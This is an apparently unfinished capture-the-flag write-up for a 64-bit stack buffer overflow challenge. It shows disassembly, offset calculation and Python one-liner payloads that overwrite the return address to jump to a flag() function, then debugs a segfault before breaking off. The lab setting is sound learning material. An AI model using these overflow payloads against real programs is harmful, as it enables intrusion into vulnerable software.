# NewOverflow 1

This challenge is basically a 64-bit Buffer Overflow .What used to be 4 bytes is now 8 bytes.

The only difference is the size of the memory spaces. If we happen to specify an address greater than **0x00007fffffffffff** It will raise an exception.




## Taking control of RIP

From the disassembly of the vuln function we can see that the buffer is at address **rbp-0x40** 
``` assembly
   0x00000000004007cc <+0>:     push   rbp
   0x00000000004007cd <+1>:     mov    rbp,rsp
   0x00000000004007d0 <+4>:     sub    rsp,0x40
   0x00000000004007d4 <+8>:     lea    rax,[rbp-0x40]
   0x00000000004007d8 <+12>:    mov    rdi,rax
   0x00000000004007db <+15>:    mov    eax,0x0
   0x00000000004007e0 <+20>:    call   0x400630 <gets@plt>
   0x00000000004007e5 <+25>:    nop
   0x00000000004007e6 <+26>:    leave  
   0x00000000004007e7 <+27>:    ret    

```
So, we input 0x40 bytes to get to rbp & 0x8 bytes to override rbp + 0x6 bytes to override rip(so we avoid raising an excption)

now, load up gdb and try out your exploit.

``` gdb
  gdb-peda$ r < <(python -c 'print("A"*64+"B"*8+"C"*6)')  
  Starting program: /home/arch3r/p1c0CTF_2019/N3w_0v3rflow/vuln < <(python -c 'print("A"*64+"B"*8+"C"*6)')
  Welcome to 64-bit. Give me a string that gets you the flag: 

  Program received signal SIGSEGV, Segmentation fault.
  Stopped reason: SIGSEGV
  0x0000434343434343 in ?? ()


```
We get control of eip..!

## Scripting the Exploit

We put in the address of the flag() ```\x67\x07\x40\x00\x00\x00\x00\x00```function instead of ```"C"*6``` to change code flow towards our flag() function.

We expect this to give us the flag ...but it doesn't .We end up getting a segfault.
``` bash
  arch3r@1nv4d3r:~/p1c0CTF_2019/N3w_0v3rflow$ python -c 'print("A"*72+"\x67\x07\x40\x00\x00\x00\x00\x00")' | ./vuln
  Welcome to 64-bit. Give me a string that gets you the flag: 
  Segmentation fault (core dumped)
```
Let's inspect this using gdb ..

## Debugging the Exploit

After setting a breakpoint at flag() in gdb ,we see that our exploit did actually override rip correctly and we do end up in the flag() function

``` gdb
  gdb-peda$ r < <(python -c "print 'A'*72 + '\x67\x07\x40\x00\x00\x00\x00\x00'")
  Starting program: /home/arch3r/p1c0CTF_2019/N3w_0v3rflow/vuln < <(python -c "print 'A'*72 + '\x67\x07\x40\x00\x00\x00\x00\x00'")
  Welcome to 64-bit. Give me a string that gets you the flag: 
  Breakpoint 1, 0x0000000000400767 in flag ()

```
lets continue execution till the segfault
```gdb
  Stopped reason: SIGSEGV
  buffered_vfprintf (s=s@entry=0x7ffff7fa76a0 <_IO_2_1_stdout_>, format=format@entry=0x7fffffffdee8 "flag{A_n3w_0v3rflow}\n", args=args@entry=0x7fffffffde08, mode_flags=mode_flags@entry=0x0) at vfprintf-internal.c:2377
  2377    vfprintf-internal.c: No such file or directory.
```

**############################################Incomplete ############################################**
